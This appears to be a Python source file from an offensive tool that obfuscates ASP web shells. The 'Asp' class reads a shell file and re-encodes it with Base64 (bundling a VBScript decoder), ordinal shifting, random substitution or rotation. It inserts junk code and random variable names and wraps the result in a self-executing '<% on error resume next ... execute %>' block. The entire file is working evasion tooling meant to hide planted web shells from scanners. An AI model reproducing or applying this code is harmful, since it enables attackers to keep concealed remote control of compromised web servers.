#! /usr/bin/python 

import re
from shell import Shell 
from util import Encoders, Junk, AspParser 


VBS_B64 = '''
class Base64 
	
	Public Function Decode( byVal strIn )
		Dim w1, w2, w3, w4, n, strOut
		For n = 1 To Len( strIn ) Step 4
			w1 = mimedecode( Mid( strIn, n, 1 ) )
			w2 = mimedecode( Mid( strIn, n + 1, 1 ) )
			w3 = mimedecode( Mid( strIn, n + 2, 1 ) )
			w4 = mimedecode( Mid( strIn, n + 3, 1 ) )
			If w2 >= 0 Then strOut = strOut + Chr( ( ( w1 * 4 + Int( w2 / 16 ) ) And 255 ) )
			If w3 >= 0 Then strOut = strOut + Chr( ( ( w2 * 16 + Int( w3 / 4 ) ) And 255 ) )
			If w4 >= 0 Then strOut = strOut + Chr( ( ( w3 * 64 + w4 ) And 255 ) )
		Next
		Decode = strOut
	End Function
	
	Private Function mimedecode( byVal strIn ) 
		dim B64C : B64C = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/" 
		If Len( strIn ) = 0 Then 
			mimedecode = -1 : Exit Function
		Else
			mimedecode = InStr( B64C, strIn ) - 1
		End If
	End Function
	
end class
'''


class Asp(Shell): 
	
	def __init__(self, path = None):
		Shell.__init__(self, 'asp')
		self.shell_path = self.Path.asp if path == None else path
		self.shell_text = self.Read(self.shell_path)
	
	def Encode(self, encoding): 
		self.encoding = encoding
		if encoding == 'b64' : return self.Base64()
		if encoding == 'ord' : return self.OrdPlus()
		if encoding == 'rnd' : return self.Random()
		if encoding == 'rot' : return self.RotPlus()
	
	def Create(self, payload, add_junk = False): 
		shell = payload + '\nexecute ' + self.vars[-1] + ' \n'
		if add_junk and self.encoding != 'b64' : 
			shell = ''.join( 
				line + ' \n' + Junk().Asp([ self.makeVars() for _ in range(4) ])[self.rndInt(1, 4)] + '\n' 
				for line in shell.split(' \n') if line.strip() != '' 
			)
		shell = '<% \non error resume next \n' + shell +  '%>' 
		return shell
	
	def Base64(self): 
		shell_encoded = Encoders(self.Executable(self.shell_text)).Base64()
		junk = self.makeJunk(shell_encoded , self.an_chars) 
		vals = self.makeVals(shell_encoded, junk)
		self.vars += [ self.makeVars() for _ in range(4) ]
		
		payload = 'dim ' + self.vars[0] + ', ' + self.vars[1] + ', ' + self.vars[2] + ', ' + self.vars[3] + ' \n' 
		payload += self.vars[0] + ' = "" \n' 
		payload += ''.join([ self.vars[0] + ' = ' + self.vars[0] + ' & "' + vals[i] + '" \n' for i in range(len(vals))]) 
		payload += VBS_B64 + ' \nset ' + self.vars[1] + ' = new Base64 \n'
		payload += self.vars[2] + ' = Replace( ' + self.vars[0] + ', "' + junk + '", "") \n' 
		payload += self.vars[3] + ' = ' + self.vars[1] + '.Decode( ' + self.vars[2] + ' ) \n'
		return payload
	
	def OrdPlus(self): 
		shell_encoded, ord_plus, chr_join = Encoders(self.Executable(self.shell_text)).OrdPlus()
		vals = self.makeVals(shell_encoded)
		self.vars = [ self.makeVars() for _ in range(3) ]
		
		payload = 'dim ' + self.vars[0] + ', ' + self.vars[1] + ', ' + self.vars[2] + ' \n' 
		payload += self.vars[2] + ' = "" \n' 
		payload += self.vars[0] + ' = "" \n' 
		payload += ''.join([ self.vars[0] + ' = ' + self.vars[0] + ' & "' + vals[i] + '" \n' for i in range(len(vals)) ]) 
		payload += 'for each ' + self.vars[1] + ' in split(' + self.vars[0] + ', "' + chr_join + '") : ' 
		payload += self.vars[2] + ' = ' + self.vars[2] + ' & chr(' + self.vars[1] + ' - ' + str(ord_plus) + ') : next \n' 
		return payload
	
	def Random(self): 
		vbSpecialChars = lambda s : s.replace('"', '""').replace('\\\\', '\\').replace('\\n', '" & chr(10) & "').replace('\\t', '" & chr(9) & "')
		shell_encoded, cs1, cs2 = Encoders(self.Executable(self.shell_text)).Random()		
		vals = self.makeVals(shell_encoded)
		self.vars = [ self.makeVars() for _ in range(4) ]
		
		payload = 'dim ' + self.vars[0] + ', ' + self.vars[1] + ', ' + self.vars[2] + ', ' + self.vars[3] + ' \n' 
		payload += self.vars[3] + ' = "" \n' 
		payload += self.vars[0] + ' = "" \n' 
		payload += ''.join([ 
			self.vars[0] + ' = ' + self.vars[0] + ' & "' + vbSpecialChars(vals[i].encode('unicode-escape')) + '" \n' 
			for i in range(len(vals)) 
		]) 
		payload += self.vars[1] + ' = "' + vbSpecialChars(cs2.encode('unicode-escape')) + '" \n' 
		payload += self.vars[2] + ' = "' + vbSpecialChars(cs1.encode('unicode-escape')) + '" \n' 
		payload += 'for i = 1 to len(' + self.vars[0] + ') \n' 
		payload += 'if instr(1, ' + self.vars[2] + ', mid(' + self.vars[0] + ', i, 1)) > 0 then ' 
		payload += self.vars[3] + ' = ' + self.vars[3] + ' & mid(' + self.vars[2] + ', instr(1, ' + self.vars[1] + ', mid(' + self.vars[0] + ', i, 1)), 1) \n' 
		payload += 'if instr(1, ' + self.vars[2] + ', mid(' + self.vars[0] + ', i, 1)) = 0 then ' 
		payload += self.vars[3] + ' = ' + self.vars[3] + ' & mid(' + self.vars[0] + ', i, 1) \n' 
		payload += 'next \n' 
		return payload
	
	def RotPlus(self): 
		vbSpecialChars = lambda s : s.replace('"', '""').replace('\n', '" & chr(10) & "').replace('\t', '" & chr(9) & "')
		shell_encoded, rows = Encoders(self.Executable(self.shell_text)).Rot90()
		vals = self.makeVals(shell_encoded)
		self.vars = [ self.makeVars() for _ in range(4) ]
		
		payload = 'dim ' + self.vars[0] + ', ' + self.vars[1] + ', ' + self.vars[2] + '(' + str(rows) + '), ' + self.vars[3] + ', i, r \n' 
		payload += self.vars[1] + ' = ' + str(rows) + ' \n' 
		payload += self.vars[0] + ' = "" \n' 
		payload += ''.join([ self.vars[0] + ' = ' + self.vars[0] + ' & "' + vbSpecialChars(vals[i]) + '" \n' for i in range(len(vals)) ]) 
		payload += 'for i = 0 to (len(' + self.vars[0] + ') / ' + self.vars[1] + ') - 1 \n' 
		payload += 'for r = 1 to ' + self.vars[1] + ' : ' 
		payload += self.vars[2] + '(r) = ' + self.vars[2] + '(r) & mid(' + self.vars[0] + ', r + i * ' + self.vars[1] + ', 1) : next \n'
		payload += 'next \n' 
		payload += self.vars[3] + ' = trim(join(' + self.vars[2] + ', "")) \n' 
		return payload
	
	def Executable(self, shell_data): 
		strings = lambda string : string.replace('"', '""').replace('<%', '< %').replace('%>', '% >')
		parser = AspParser(shell_data) 
		parts = parser.getParts() 
		asp = { part : parser.stripTags(part) for part in parts['asp'] }
		asp = { 
			part : 'response.write ' + asp[part].strip()[1:] + ' ' if asp[part].strip()[:1] == '=' else asp[part] 
			for part in asp 
		}
		html = { 
			h : 'response.write ' + ' & '.join([ '"' + strings(l) + '"' for l in h.split('\n') if l.strip() != '' ]) 
			for h in parts['html'] 
		}
		shell_txt = parser.stripHead()
		for h in html : shell_txt = re.sub('((^|(?<=%>))' + re.escape(h) + '(?=(<%|$)))', '\n' + html[h] + '\n', shell_txt)
		for a in asp : shell_txt = shell_txt.replace(a, asp[a])
		return shell_txt


